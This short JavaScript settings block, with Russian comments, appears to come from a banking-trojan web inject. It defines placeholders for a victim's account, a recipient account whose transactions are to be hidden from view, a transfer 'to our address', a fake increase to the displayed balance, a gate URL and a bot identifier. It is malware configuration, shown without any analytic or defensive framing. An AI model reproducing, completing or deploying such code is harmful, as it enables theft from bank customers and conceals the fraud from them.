/*настройки*/
var acc_id = "%acc_id%";		//Номер счета с которого переводят
var acc_id_to = "%acc_id_to%";	//Номер счета на который переводят (транзакции с этим счетом-получателем будут скрыты)
var transfer_date = "%transfer_date%";			//Дата выполнения перевода в наш адресс
var balance = parseFloat("%balance%");						//Сумма на которую будет увеличен счет
var trans_id = parseInt("%trans_id%");							//Номер транзакции в "Платежных поручениях"
var gate_url = "http://test1.ru/gate";
var bid = "bot_v6";

/*системные настройки*/
var money_delimiter_char = String.fromCharCode(160);	//Символ разделитель в деньгах
